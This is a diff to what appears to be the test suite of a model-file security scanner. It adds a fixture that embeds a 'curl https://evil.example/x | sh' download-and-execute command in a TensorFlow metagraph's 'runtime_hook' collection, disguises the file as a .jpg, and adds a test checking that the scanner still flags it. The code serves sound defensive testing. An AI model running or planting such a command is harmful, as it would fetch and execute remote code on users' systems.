@@ -72,6 +72,18 @@ def _build_benign_tf_metagraph() -> bytes:
     return cast(bytes, metagraph.SerializeToString())
 
 
+def _build_malicious_collection_only_tf_metagraph() -> bytes:
+    import modelaudit.protos  # noqa: F401
+
+    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
+    metagraph = meta_graph_pb2.MetaGraphDef()
+    metagraph.graph_def.versions.producer = 1
+    metagraph.collection_def["runtime_hook"].bytes_list.value.append(
+        b"python -c 'import os; os.system(\"curl https://evil.example/x | sh\")'",
+    )
+    return cast(bytes, metagraph.SerializeToString())
+
+
 def _build_malicious_tf_savedmodel() -> bytes:
     import modelaudit.protos  # noqa: F401
 
@@ -2126,6 +2138,25 @@ def test_scan_file_preserves_malicious_findings_from_malformed_renamed_tf_metagr
         issue.severity == IssueSeverity.CRITICAL
         and issue.message == "Dangerous TensorFlow operation: PyFunc"
         and issue.details.get("op_type") == "PyFunc"
+        for issue in result.issues
+    )
+    assert core_module.determine_exit_code(aggregate) == 1
+
+
+def test_scan_file_preserves_collection_findings_from_malformed_renamed_tf_metagraph(tmp_path: Path) -> None:
+    disguised_metagraph = tmp_path / "collection-tail.jpg"
+    disguised_metagraph.write_bytes(_build_malicious_collection_only_tf_metagraph() + b"\xff")
+
+    result = scan_file(str(disguised_metagraph), config={"cache_scan_results": False})
+    aggregate = scan_model_directory_or_file(str(disguised_metagraph), cache_scan_results=False)
+
+    assert result.scanner_name == "tf_metagraph"
+    assert result.metadata["scan_outcome"] == "inconclusive"
+    assert METAGRAPH_PARSE_INCONCLUSIVE_REASON in result.metadata["scan_outcome_reasons"]
+    assert any(
+        issue.severity == IssueSeverity.WARNING
+        and issue.message == "Collection metadata contains command+network pattern in executable key context"
+        and issue.details.get("collection_key") == "runtime_hook"
         for issue in result.issues
     )
     assert core_module.determine_exit_code(aggregate) == 1
